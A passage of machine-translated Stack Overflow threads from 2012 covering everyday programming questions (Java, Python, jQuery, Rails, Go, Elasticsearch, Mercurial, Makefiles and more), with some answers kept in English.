您可以使用floatval($stringVar)将字符串转换为浮点数

PHP 支持数学运算符。

所以如果你有 $a 和 $b。

```
$a + $b; 
$a - $b; 
$a * $b; 
$a / $b; 
$a % $b; 
```

# java - 不使用局部变量的值？它不应该是吗？

> ID：12014560
> 
> 赞同：0
> 
> 时间：2012-08-17T23:55:11.780
> 
> 标签：java, eclipse, variables, local

好的，所以我正在制作一个简单的用户输入类型的计算器，提供加、减、乘、除选项。当我运行程序时，一切都很顺利，直到我按下回车键，希望得到我的结果.......没有任何反应。并且 eclipse 给出的唯一警告是未使用局部变量 answer 的值....这是我的代码：

```
class apples {
public static void main(String args[]) {
    System.out
            .println("To Add Press 1 , To Subtract Press 2, To Multiply Press 3, To Divide Press 4");
    Scanner sc = new Scanner(System.in);
    int i = sc.nextInt();
    double fnum, snum, answer;

    if (i == 1) {
        System.out.println("Enter Your First Number: ");
        fnum = sc.nextDouble();
        System.out.println("Enter Your Second Number");
        snum = sc.nextDouble();
        answer = fnum + snum;
    } else if (i == 2) {
        System.out.println("Enter Your First Number: ");
        fnum = sc.nextDouble();
        System.out.println("Enter Your Second Number");
        snum = sc.nextDouble();
        answer = fnum - snum;
    } else if (i == 3) {
        System.out.println("Enter Your First Number: ");
        fnum = sc.nextDouble();
        System.out.println("Enter Your Second Number");
        snum = sc.nextDouble();
        answer = fnum * snum;
    } else if (i == 4) {
        System.out.println("Enter Your First Number: ");
        fnum = sc.nextDouble();
        System.out.println("Enter Your Second Number");
        snum = sc.nextDouble();
        answer = fnum / snum;
    }
} 
```

}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T23:57:30.510

您可以在最后添加：

```
System.out.println(ans) 
```

（我会把它放在评论中，但我没有代表）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T23:57:22.850

你从不打印`ans`……所以只有你的程序知道答案……

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-17T06:18:46.973

1.  正如您在程序中所知道的那样，您想使用变量打印一些东西，并且您会很好地声明它。

2.  但这里的重点是，除非您通过在 System.out.print(ans); 中使用该变量来充分利用该变量，否则该声明将毫无用处。线。

3.  通过这样做，您告诉编译器您已经对变量进行了相应的调用。如果您想要预期的输出，那么您需要遵循它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-18T01:12:25.383

> 不使用局部变量的值？它不应该是吗？

如果不应该使用局部变量的值，那么首先将值存储在局部变量中是没有意义^的。“修复”是重新获得变量。

这个编译警告是为了告诉你你可能忘记了一些东西。要么您忘记删除不再需要的声明，要么您忘记添加将使用该变量的代码。由您决定这两种情况中的哪一种是正确的。

^(1 - 实际上，将表达式分配给您不打算使用的变量有时很有用；例如，这样您就可以在调试时看到它是什么。但是，您应该避免在生产代码中这样做，因为它会使代码不可读，并且可能会降低效率。)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-17T23:59:09.433

您存储计算的答案，但您从不使用或打印出来。该程序完全按照您的要求执行，然后完成。您只需要显示答案变量

# python - Python Mechanize 不提交，但在计算机上工作？

> ID：12014562
> 
> 赞同：1
> 
> 时间：2012-08-17T23:55:34.873
> 
> 标签：python, mechanize

好的，所以我有一个服务器（由 Godaddy 托管，它是 runny python 2.4.3，Red Hat），在该服务器上，我想通过我的 python 脚本访问另一个站点并登录并执行任务，然后简单地注销对吗？问题是当我运行它时，登录没有提交。奇怪的是，当我在我的计算机上运行脚本（运行 python 2.7.2，Mac OS X）时，它可以完美地提交并且一切正常（是的，脚本完全相同）。这是我的脚本：

```
browser.open("website")
browser.select_form(name="form_name")
browser.form['theAccountName']= username
browser.form['theAccountPW'] = password
browser.submit() 
```

任何朝着正确方向的轻推都将有助于在此问题上停留数天。

可能还需要注意的是，我不知道为什么，我无法在我的服务器上“安装”机械化，这符合 Godaddy 的限制。我把它放在同一个文件夹中以便导入。

谢谢。

# ajax - Jquery 不会使用 youtube api 捕获 ajax 错误

> ID：12014563
> 
> 赞同：0
> 
> 时间：2012-08-17T23:55:40.697
> 
> 标签：ajax, jquery, youtube-api

我正在尝试使用 jquery 从 youtube api 获取一些视频数据和搜索结果数据。由于某种原因，我拥有的代码没有发现任何错误。这是一个视频 id 格式错误的[jsFiddle](http://jsfiddle.net/3bTKU/5/)。当我在控制台中对其进行测试时，这会返回一个错误，但由于某种原因，我的代码无法正常工作。我最初尝试使用 getJson 和那里的错误处理方法，但没有奏效。

我是 jquery 和 ajax 的新手，特别是所以我能得到的所有帮助都将不胜感激！

这是我的代码（在 jsFiddle 中是一样的）。

```
$.ajax({
    url: 'https://gdata.youtube.com/feeds/api/videos?category=dogs&orderby=published&alt=json&callback=?&max-results=5',
    //contentType: "application/json; charset=utf-8",
    dataType: 'json',
    success: function(data) {
        $.each(data.feed.entry, function(i, item) {
            var title = item['title']['$t'];
            var video = item['id']['$t'];
            var video = video.replace('http://gdata.youtube.com/feeds/api/videos/', 'http://www.youtube.com/watch?v=');
            var videoID = video.replace('http://www.youtube.com/watch?v=', '');
            $.ajax({
                url: 'https://gdata.youtube.com/feeds/api/videos/' + videoID + 'MALFORMEDID?v=2&alt=json&callback=?',
                //contentType: "application/json; charset=utf-8",
                dataType: 'json',
                success: function(videoData) {
                    alert(title);
                },
                ajaxError: function(e) {
                    alert("could not find youtube vid");
                }
            });
        });
    },
    error: function(e) {
        alert("oh no!");
    }
});​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:05:11.957

尝试

```
error: function(e) { 
```

代替

```
ajaxError: function(e) { 
```

**编辑：**

执行 jsonp 时似乎不会调用错误回调。见手册。

[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

您可能想改用 getJSON。

[http://api.jquery.com/jQuery.getJSON/](http://api.jquery.com/jQuery.getJSON/)

# java - 设置 mincraft 服务器端口外部属性

> ID：12014564
> 
> 赞同：1
> 
> 时间：2012-08-17T23:55:43.147
> 
> 标签：java, jar, webserver, port, minecraft

可能不可能，但我想我会问。

我有一个脚本用这个命令启动我的 minecraft 服务器

```
java -jar minecraft_server.jar 
```

没有传入内存设置或其他任何内容。是否可以声明服务器应在此级别上运行的端口？IE

```
java -jar minecraft_server.jar -p MINECRAFT_PORT 
```

* * *

如果这是不可能的，那该怎么办。在 server.properties 文件中，声明了 post var。有没有办法将它指向一个 ENV 变量？即 MINECRAFT_PORT？

感谢任何知道这个的人。

Ps 这个比游戏更技术性，所以这就是为什么它在这里而不是在 Arqade。它与实际游戏无关，更多与环境变量和服务器配置有关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:27:36.167

我看到的所有证据都指向了答案——不，你不能那样做。

*   配置 Minecraft 服务器端口和 IP 的唯一记录方法是通过“server.properties”文件。
*   属性文件的位置是“固定的”。没有记录的方法可以通过 Java 命令参数覆盖它。
*   由于该文件显然只是一个常规的 Java 属性文件，因此不会将任何环境变量（如您的假设`MINECRAFT_PORT`）插入到属性中……除非 Minecraft 代码明确执行此操作。（如果是的话，你会期望文档会提到这一点。）

* * *

在字里行间，我猜您正在尝试使用在所有实例中“几乎相同”的属性文件运行多个服务器。您可以通过创建包含所有共享属性设置和非共享值的占位符的“模板”属性文件来实现几乎相同的目标。然后使用一个简单的预处理器来扩展每个变体的占位符。

或者只是使用不同的属性文件并手动保存它们。

# ruby-on-rails - 如何在 text_field_tag 中传递多个参数

> ID：12014567
> 
> 赞同：0
> 
> 时间：2012-08-17T23:55:54.450
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

好的，所以当用户单击“添加”按钮或“搜索”按钮时，我试图从一个文本字段中获取值并将其传递给 viewController 中的两种不同方法（因此，如果用户按下搜索按钮，它将进行搜索方法，如果用户单击添加按钮，它会转到添加方法），到目前为止，这段代码可以解决问题，但我不喜欢必须有两个文本字段，我应该使用 button_to 吗？如果是这样，那会怎样？谢谢

```
 <p><%= form_tag :controller => 'projects', :action => 'search', :method => 'get' do %>

  <%= text_field_tag :search, params[:search] %>
  <%= submit_tag "search" %>
  <%= link_to_function "Clear", "$('search_field').clear()" %>
  <% end %>
  </p>

  <p><%= form_tag :controller => 'projects', :action => 'add_project_to_user' do %>
  <%= text_field_tag :text, params[:text] %>
  <%= submit_tag "Add" %>
  <%= link_to_function "Clear", "$('search_field').clear()" %>
  <% end %>
  </p> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:22:22.650

感谢您的澄清。限制是 HTML，而不是 Rails：一个表单只能有一个动作。即：一个控制器和一个动作。

选项很少。您可以在控制器中分支您的行为。有一个处理搜索或添加的操作，具体取决于单击哪个按钮（是的，您可以在表单中有多个按钮；对此有一个[旧的 railscasts（第 38 集）](http://railscasts.com/episodes/38-multibutton-form "老 Railscasts（第 38 集）")。但是这相当笨拙。

另一种选择是使用 JavaScript 设置表单上的操作以响应按钮单击。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:17:02.783

有一个带有两个提交按钮的表单。在每个按钮上放置一个“onclick”事件。单击按钮时，它可以使用 javascript 在提交之前更改表单的操作。每个按钮显然会更改适合其自身的操作（搜索或添加）。

# ruby-on-rails - 为什么我没有获得正确输出以获取路由的嵌套资源的路由匹配？

> ID：12014568
> 
> 赞同：0
> 
> 时间：2012-08-17T23:55:56.193
> 
> 标签：ruby-on-rails, routing, devise, nested-attributes

我正在使用设计。我正在更新一组日志条目。

我的路线看起来像：

```
 devise_for :users

  resources :users do
    resources :exercises do
      resources :log_entries
    end
  end 
```

我也有一个表格`Started PUT "/users/1/exercises/1/log_entries"`

然后我收到以下错误：

```
Routing Error

No route matches [PUT] "/users/1/exercises/1/log_entries" 
```

编辑：我知道问题可能是什么。我正在尝试更新 log_entries 的集合。所以它击中的是 PUT 而不是 POST。我不确定如何解决这个问题，因为 Rails 没有提供 PUT 集合的方法。

编辑 x2：我尝试这样做的原因是因为我目前有一个执行此操作的表单：

```
 = semantic_form_for [current_user, ew.exercise] do |exercise| 
```

表单内部是 log_entries 的集合。假设有5个。

现在我更新每个 log_entry 或者更动态地添加。他们击中了练习控制器，我被迫以一种骇人听闻的方式设置 user_id，如下所示：

```
params[:exercise][:log_entries_attributes].each do |value|
  value[1].merge!(:user_id => current_user.id)
end 
```

我想要做的是点击 log_entries 控制器，所以我不必执行上述操作。使这个棘手的是正确地通过集合。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:01:57.463

可能你不见了

`new_user_exercise_log_entry(@user,@exercises)`

对于嵌套资源，你不能称之为普通`new_user_exercise_log_entry()`

=== 更新 ===

:url => user_exercise_log_entries_path(current_user, ew.exercise)

应该

:url => user_exercise_path(current_user, ew.exercise)

# java - java nio 和 stdin、stdout、stderr 的流结束

> ID：12014570
> 
> 赞同：1
> 
> 时间：2012-08-17T23:56:06.643
> 
> 标签：java, nio

我有一个程序 A 通过 Pipe.SourceChannel 在 ByteBuffer 中接收另一个程序 B 的标准输出。

程序将从 ByteBuffer 读取 stdout 直到它到达流的末尾（即，直到 ByteBuffer 的 read() 返回 -1）。

程序B的stdout可以在程序执行中多次打开和关闭吗？也就是说，read() 是否有可能返回 -1，但后来程序 B 有额外的 stdout，在这种情况下，程序 A 应该对 ByteBuffer 进行另一次 read()？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T07:53:23.783

在 Linux 下，您可以将 NIO 用于 stdin、stdout 和 stderr，因为它们与某些字符设备相关联，可以作为文件访问。为此，您可以`/proc/self/fd/0`分别打开`1`或`2`。这不适用于所有流类型或非 Unix 系统，但它可能是一种选择。

一旦流关闭，就无法重新打开它，除非它是一个文件并且您能够获得文件名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:06:29.793

不，这是不可能的。stdout、stderr 和 stdin 都是“特殊”流。您无法关闭它们并稍后重新打开它们。

# elasticsearch - 在 Elastic Search 中计算 *Facet Counts* 的有效方法

> ID：12014571
> 
> 赞同：3
> 
> 时间：2012-08-17T23:56:25.143
> 
> 标签：elasticsearch, faceted-search

我想计算构面查询 UI 的构面计数，但我认为我遗漏了一些东西，因为我无法使用构面过滤器获得所需的数字。

这是一个例子。给定两个方面，每个方面有三个可能的项：

```
Colors: {red, yellow, blue}
Notes: {do, re, mi} 
```

当我进行搜索时，一个方面中每个术语的计数不考虑另一个方面中设置的过滤器。

为了显示：

```
[ ] All colors (18)
 [x] Red (10)
 [ ] Green (5)
 [ ] Blue (3)

[ ] All notes (18)
 [ ] Do (5)
 [x] Re (7)
 [ ] Mi (6) 
```

请注意，每个构面内的总数与查询的命中总数相加，就好像没有设置过滤器一样。

我想要的行为是让 Notes facet 中的数字考虑 Colors facet 中的过滤器，反之亦然。也就是说，注释项的数字总和应为 10（以匹配红色过滤器），而不是 18。

有趣的是，文档中的示例屏幕截图使用了 Linked In 中的示例，该示例实际上演示了我想要的行为。

[http://www.elasticsearch.org/guide/reference/api/search/facets/](http://www.elasticsearch.org/guide/reference/api/search/facets/)

我可以通过为每个方面的每个术语手动重新提交一次查询来获得我想要的结果（呃），但我想知道是否有办法通过更改我的查询来获得与 LinkedIn 相同的行为。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-18T12:47:08.193

The only way I've found this to work is via the following logic for any multi-select facet:

Whenever the user selects a value from a facet ("drills down") you add a corresponding filter to all facets (via facet_filter) **except** the facet that the selection was done in, as well as to the top-level *filter* to filter the query results.

In other words, given 3 multi-select facets, A, B & C:

*   Select value from A => Add filter to top-level ***filter*** as well as to the **facet_filter** of facet B and C.
*   Select value from B => Add filter to top-level ***filter*** as well as to the **facet_filter** of A & C.
*   ... and so on

The top-level filter always combines the filters for all selections, whereas each individual facet contains facet_filters according to the selection in the ***other*** facets.

# python - ReportLab：如何自动调整文本大小以适合块

> ID：12014573
> 
> 赞同：9
> 
> 时间：2012-08-17T23:56:45.303
> 
> 标签：python, pdf, reportlab

我需要生成带有动态文本的 PDF，并且我正在使用 ReportLab。由于文本是动态的，是否可以调整其大小以适应 PDF 的特定区域？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-01-22T21:29:43.060

从 reportlab 2.0 版开始，鸭嘴兽具有`KeepInFrame`. 来自`CHANGES.txt`：

```
KeepInFrame:
Sometimes the length of a piece of text you'd like to include in a 
fixed piece of page "real estate" is not guaranteed to be constrained to a 
fixed maximum length. In these cases, KeepInFrame allows you to specify an 
appropriate action to take when the text is too long for the space allocated 
for it. In particular, it can shrink the text to fit, mask (truncate) 
overflowing text, allow the text to overflow into the rest of the document, or 
raise an error. 
```

我能找到的关于如何使用它的唯一示例是在 .reportlab 源代码中`tests/`。这是我最终想出的工作示例：

```
from reportlab.pdfgen.canvas import Canvas
from reportlab.lib.pagesizes import letter, landscape
from reportlab.platypus import Paragraph, Frame, KeepInFrame
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.units import inch

c = Canvas('foo.pdf', pagesize=landscape(letter))
frame1 = Frame(0.25*inch, 0.25*inch, 4*inch, 4*inch, showBoundary=1)

styles = getSampleStyleSheet()
s = "foo bar " * 1000
story = [Paragraph(s, styles['Normal'])]
story_inframe = KeepInFrame(4*inch, 8*inch, story)
frame1.addFromList([story_inframe], c)
c.save() 
```

以及完整的版本字符串：

```
>python -c "import reportlab;print reportlab.Version"
2.7 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T18:33:46.537

是的。查看 ReportLab 手册。根据您对您想要做什么的（简短）描述，听起来您需要查看在页面布局中使用框架（假设您使用鸭嘴兽，我强烈推荐）。

# objective-c - AVAudioPlayer 播放期间的音量变化

> ID：12014578
> 
> 赞同：5
> 
> 时间：2012-08-17T23:57:32.003
> 
> 标签：objective-c, avaudioplayer

我正在使用`AVAudioPlayer`. 声音每隔几秒钟从一个`NSTimer`方法中重放一次。第一次播放声音时，音量很好，但在随后的播放中，音量非常低，几乎听不见。有时音量会在第一次播放的中途发生。这发生在 iPad 3 上，因此扬声器选择不是问题。

```
NSError *phoneCallError;
NSURL *phoneCallUrl = [NSURL fileURLWithPath:[NSString stringWithFormat:@"%@/phone-calling-1.wav", [[NSBundle mainBundle] resourcePath]]];
AVAudioPlayer *phoneCallPlayer = [[AVAudioPlayer alloc] initWithContentsOfURL:phoneCallUrl error:&phoneCallError];
if (phoneCallError) {
    NSLog(@"%@: %@", self, phoneCallError);
} else {
    phoneCallPlayer.numberOfLoops = 0;
} 
```

该`NSTimer`方法只是调用`[phoneCallPlayer play]`. 任何时候都不会以编程方式设置音量。有什么建议么？谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-18T10:51:47.440

```
- (IBAction)volumeDidChange:(UISlider *)slider {
//Handle the slider movement
[audioPlayer setVolume:[slider value]]; 
```

}

should be slider minimum value 0 and maximum 1.

# email - 来自网站的短信

> ID：12014589
> 
> 赞同：0
> 
> 时间：2012-08-17T23:59:32.940
> 
> 标签：email, sms

我一直在研究如何编写网站代码（通过 php 或 javascript）向一些朋友和我的手机发送 SMS 消息。我们的想法是，我们希望在一天中的某个时间点收到带有“姿势”的消息的每日提醒，同时我们醒着，提醒我们坐直，不要无精打采等。

到目前为止，我只找到了似乎显示如何使用表单或使用其他 API 向网站所有者 (http://php.about.com/od/advancedphp/ss/mail.htm) 发送电子邮件的答案和/或服务。

我知道每部电话都有自己独特的“电子邮件地址”，通过电话公司提供，因此很容易弄清楚。我遇到的问题是如何从网站本身发送电子邮件。有没有办法通过 php 或 javascript 自动执行此操作，因此我不必每天手动发送消息？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T03:30:56.563

*“我知道每部电话都有自己独特的“电子邮件地址”，通过电话公司提供，因此很容易弄清楚。”* **不。**

*“我遇到的问题是如何从网站本身发送电子邮件。有没有办法通过 php 或 javascript 自动发送邮件，这样我就不必每天手动发送邮件了？”*

您只是在谈论每天自动发送消息吗？查看[http://www.phpjobscheduler.co.uk/](http://www.phpjobscheduler.co.uk/) - 我所做的只是谷歌 php 和预定的时间间隔。我当然不会说如何让 php 向某人发送电子邮件，因为必须有 1,000 篇关于该主题的其他帖子。

如果您想通过真实的蜂窝网络实际设置 SMS，则有付费的 API + 服务器连接到连接您的网络。寻找他们。有很多，每个都以不同的价格提供略有不同的服务。看看他们。

# version-control - 如何正确添加子存储库

> ID：12014592
> 
> 赞同：3
> 
> 时间：2012-08-17T23:59:57.387
> 
> 标签：version-control, mercurial, subrepos

我有一个名为的存储库`main`，在它下面有许多子存储库。最初创建`main`超级存储库时，我已获取现有存储库并将它们复制到`main`文件夹中，然后添加`.hgsub`文件以指示子存储库的名称。

现在，这个`main`文件夹位于我们公司的文件服务器上，由 提供服务`hgService`，我们需要向它添加新的存储库。在广阔的绿色世界中，这是如何无缝完成的？

如果我克隆`main`到我的本地机器，然后`hg init newrepo`，并将其复制到克隆`main`并添加正确的条目，`.hgsub`我可以提交，但我不能推送。它给了我一个错误`http error 404 path not found`。好的，很公平，所以我将条目添加到`hgService`的`web.conf`文件中，然后重新启动。现在我得到一个不同的错误，比如`subrepository 'newrepo' doesn't exist`Well duh！我正在尝试添加它！

所以我终于崩溃了，不得不 RAdmin 到服务器，手动创建一个新的 repo，将它添加到`main`正在服务的 repo`hgService`并提交更改。这对我来说似乎非常肮脏，让事情变得更加困难的是服务器工作目录的状态已经过时了大约 6 个月，我必须解决无数问题才能将其更新到最新版本。

必须有更好的方法来做到这一点.. 我不能让用户 RAdmining 进入公司。VCS 服务器每次都需要一个新的存储库吗？对？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-19T11:00:15.363

不幸的是，没有——添加一个新的子存储库涉及在服务器上创建它，你不能在服务器上创建`hg push`一个新的存储库。因此，如果在服务器上创建存储库需要登录到服务器，那么添加子存储库也需要同样的操作。

`hgweb`Mercurial 附带的脚本（我会[用 hgService 来指代它](http://mercurial.selenic.com/wiki/HgService)）没有让用户创建新存储库的内置机制。假设新的存储库是通过其他方式创建的，`hgweb`然后将通过 HTTP 提供只读视图，并允许用户使用 Mercurial 推送/拉到存储库。

Mercurial 还有其他 Web 前端。我对[Kallithea](https://kallithea-scm.org/)最为熟悉。它允许您直接从浏览器创建/删除存储库，因此您不再需要登录到服务器。这是一种比使用 plain 更好的管理存储库的方法`hgweb`。

# objective-c - 什么是 C 结构的 Objective C 等价物？

> ID：12014595
> 
> 赞同：1
> 
> 时间：2012-08-18T00:00:45.007
> 
> 标签：objective-c

我想将几个 NSString NSArray 和 UIColor 对象一起存储在一个类似结构的数据结构中。Objective-C 中最接近的等价物是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-18T00:04:57.920

为什么不直接上课呢？

```
@interface MyClass : NSObject
@property (strong) NSString *string;
@property (strong) NSArray *array;
@property (strong) UIColor *color;
@end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-18T00:06:51.000

如果使用 ARC，我建议你创建一个类，因为 C 结构不允许将 Objective C 对象作为实例变量。

如果不是，则可以使用 C 结构，但您需要确保正确管理内存。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T00:05:14.167

您可以只定义一个类来充当数据结构。

或者，由于 Objective-C 是 C 的超集，因此使用结构体是完全可以的。

# mongodb - Golang/mgo：无法从 MongoDB 文档中检索 int 字段的值

> ID：12014597
> 
> 赞同：3
> 
> 时间：2012-08-18T00:01:11.697
> 
> 标签：mongodb, go, mgo

我正在查询一个在其值中包含一个整数值的集合，并将生成的文档加载到此结构中：

```
type Subscription struct {
    Id bson.ObjectId "_id,omitempty"
    Listen string
    Job string
    TimeoutSeconds int
    Data string
}

var subscription Subscription

subscriptions := subscriptionsCol.Find(bson.M{"listen": "example_channel"}).Iter()
for subscriptions.Next(&subscription) {
    log("Pending job: %s?%s (timeout: %d)\n",
            subscription.Job, 
            subscription.Data, 
            subscription.TimeoutSeconds)
} 
```

这是 phpMoAdmin 向我展示的：

```
[_id] => MongoId Object (
    [$id] => 502ed8d84eaead30a1351ea7
)
[job] => partus_test_job_a
[TimeoutSeconds] => 30
[listen] => partus.test
[data] => a=1&b=9 
```

它`subscription.TimeoutSeconds`总是包含 0 让我感到困惑，当我 确定我`30`在我插入到集合中的文档中时。

所有其他值都可以正常检索。

int 类型有什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T01:25:46.557

您是否尝试过为该字段设置“键”值？

[解组](http://go.pkgdoc.org/labix.org/v2/mgo/bson#Unmarshal)

> 小写的字段名称用作每个导出字段的键，但可以使用相应的字段标记更改此行为。

```
type Subscription struct {
    Id              bson.ObjectId    "_id,omitempty"
    Listen          string
    Job             string
    TimeoutSeconds  int     "TimeoutSeconds"
    Data            string
} 
```

其他字段工作正常，因为它们的小写值与集合中的 Mongo 字段匹配，而`TimeoutSeconds`使用的是 TitleCase。发生的事情是 int 字段被保留为零值，因为`Unmarshal`无法将字段映射到它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-29T11:42:43.727

解组数据时，支持多个键。下面是一些例子：

```
type T struct {
    A bool
    B int    "myb"
    C string "myc,omitempty"
    D string `bson:",omitempty" json:"jsonkey"`
    E int64  ",minsize"
    F int64  "myf,omitempty,minsize"
} 
```

编组期间 1 个键值对的一般规范是：

```
"[<key>][,<flag1>[,<flag2>]]"

`(...) bson:"[<key>][,<flag1>[,<flag2>]]" (...)` 
```

GO 提供对特定关键字的支持，例如 bson（用于 mongo 键）和 json 用于在响应中设置 json 键。

查看[Marshal GO 参考](https://godoc.org/labix.org/v2/mgo/bson#Marshal)以获取更多信息。

类似地，有一些框架提供了进一步的选项来定义解析前的键。例如，在 sql 中，jinzhu github 库支持设置默认值、映射的列 id 等。

任何人都可以使用此功能并提供定制支持。

# python - Python 装饰器添加类级变量

> ID：12014599
> 
> 赞同：6
> 
> 时间：2012-08-18T00:01:41.847
> 
> 标签：python, inheritance, metaprogramming, decorator, python-decorators

我有2个A类和B类：

```
class A(object):
    x = 0

class B(object):
    y = 0 
```

我怎样才能使它**B**通过使用装饰器“继承” **A**的类级变量（在本例中为**x ）？**有可能吗？期望的行为（如果可能的话），在装饰之后，**B**看起来像这样：

```
class B(object):
    x = 0
    y = 0 
```

* * *

注意：如果有人想/需要知道我为什么要问这个问题，这只是为了让 SQLAlchemy 的具体表继承在代码中看起来更好，尽管我可以看到许多此类行为的用例。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-18T00:05:51.383

你当然可以; 您可以使用将类 A 作为参数的类装饰器，然后为您更新装饰类：

```
import types

class copyattributes(object):
    def __init__(self, source):
        self.source = source

    def __call__(self, target):
        for attr, value in self.source.__dict__.items():
            if attr.startswith('__'):
                continue
            if isinstance(value, (property, types.FunctionType)):
                continue
            setattr(target, attr, value)
        return target 
```

装饰器复制任何真正的属性（不是函数或属性），并且不以双下划线开头。

用法：

```
class A(object):
    x = 0

@copyattributes(A)
class B(object):
    y = 0 
```

在提示下测试：

```
>>> class A(object):
...     x = 0
...
>>> @copyattributes(A)
... class B(object):
...     y = 0
... 
>>> B.y
0
>>> B.x
0
>>> dir(B)
['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'x', 'y'] 
```

# c# - 序列化数据集在列中丢失了自定义数据类型

> ID：12014601
> 
> 赞同：0
> 
> 时间：2012-08-18T00:02:06.013
> 
> 标签：c#, serialization, dataset

我正在通过 WCF 传递数据集和/或在会话管理器中对其进行序列化。反序列化对象后，数据从自定义列中消失。我可以在对象被序列化之前验证数据是否存在。自定义对象用于实现字母数字排序，它使用 [Serializable] 属性。数据集不是强类型的。

解决方案遵循...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:02:06.013

自定义数据类型可以在数据集中进行序列化，但它们需要实现 IXmlSerializable 接口。

```
using System;
using System.Text;
using System.Xml;
using System.Xml.Schema;
using System.Xml.Serialization;

  [Serializable]
  public class AlphaNumericSort : IComparable, IXmlSerializable
  {
...
    // Xml Serialization Infrastructure 
    public void WriteXml (XmlWriter writer)
    {
        writer.WriteString(_Value);
    }

    public void ReadXml (XmlReader reader)
    {
        _Value = reader.ReadString();
    }

    public XmlSchema GetSchema()
    {
        return(null);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:23:42.417

传递数据集或数据表不是一个好习惯。因此，在数据集中迭代您的数据表并填充您将序列化的自定义类或类集合（不要忘记设置 datacontract 和 datamember 属性）

# c - 命令行参数到 make 文件中

> ID：12014603
> 
> 赞同：0
> 
> 时间：2012-08-18T00:03:05.840
> 
> 标签：c, makefile, command-line-arguments

我有一个 C 文件，我想为其提供 cmd 行参数。

说

```
$ make --argument1 
```

或类似的东西。

因此，在我的主程序中，我应该能够执行 argv[1] 并能够访问该变量。

我试图寻找这样做的方法。实际上有没有办法做到这一点？

这些是我在 GNULinux 手册上找到的关于 make 的相关内容。

> 命令行定义的变量通过MAKEFLAGS传递给子make。MAKEFLAGS 值中包含 '=' 的单词，make 将其视为变量定义，就像它们出现在命令行上一样。

这是我需要阅读更多内容还是在不同的背景下？

请让我知道。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:06:07.267

我认为您误解了命令行参数的使用-它们是在执行可执行文件时而不是在编译时给出的。

更好的例子

foo.c

```
#include <stdio.h>

int main()
{
   int myval=DEFVAL;

   printf("myval=%d\n", myval);
   return 0;
} 
```

生成文件

```
DEFVAL=17

foo: foo.c
   gcc -DDEFVAL=${DEFVAL} foo.c -o $@ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T06:15:12.723

你的问题没有多大意义，所以我要在字里行间阅读，猜测你有一个别人写的 Makefile，当你运行 make 时，它​​运行一些程序，这就是程序你想给出命令行参数。

为此，您可能必须修改 Makefile。为此，它有助于理解 make 如何工作以及如何使用它（您可能想找到一本关于该主题的书，例如[这本](http://shop.oreilly.com/product/9780937175903.do)），但修改 Makefile 可能不会太麻烦。

在 Makefile 的某个地方，您会找到用于调用您的程序的操作行。如果你能找到那行，你可以添加你想要的参数。

# ruby-on-rails - 如何在使用 rails/nginx/node/redis 运行的 heroku 上部署应用程序

> ID：12014604
> 
> 赞同：2
> 
> 时间：2012-08-18T00:03:24.750
> 
> 标签：ruby-on-rails, heroku, nginx, redis

我有一个在 Ruby on Rails 上本地运行的应用程序，而 nginx 是我的资产服务器。我有节点服务器运行实时的东西。与 node 一起运行的 js 文件位于 rails 应用程序文件夹中。Redis 订阅用于 node 和 rails 之间的中间存储。因此，它位于 js 文件中。它正在订阅来自 sql server 触发器操作的数据。Redis 服务器作为服务运行。

有了这个简短的场景，你们有没有一个粗略的想法，我该如何在 heroku 中部署一个包含所有这些的应用程序？

任何意见都受到高度赞赏。

问候， 萨加尔

# javascript - 如何延迟加载 div 背景图片

> ID：12014606
> 
> 赞同：59
> 
> 时间：2012-08-18T00:03:35.280
> 
> 标签：javascript, jquery, image, background, lazy-loading

众所周知，它被广泛用于延迟加载图像。

现在我想将其用作延迟加载 div 背景图像。

我怎样才能做到这一点 ？

我目前可以使用[http://www.appelsiini.net/projects/lazyload](http://www.appelsiini.net/projects/lazyload)该插件

所以我需要修改它以使其适用于 div 背景

需要帮忙。谢谢你。

下面的部分我想延迟加载图像

```
$self.one("appear", function() {
    if (!this.loaded) {
        if (settings.appear) {
            var elements_left = elements.length;
            settings.appear.call(self, elements_left, settings);
        }
        $("<img />")
            .bind("load", function() {
                $self
                    .hide()
                    .attr("src", $self.data(settings.data_attribute))
                    [settings.effect](settings.effect_speed);
                self.loaded = true;

                /* Remove image from array so it is not looped next time. */
                var temp = $.grep(elements, function(element) {
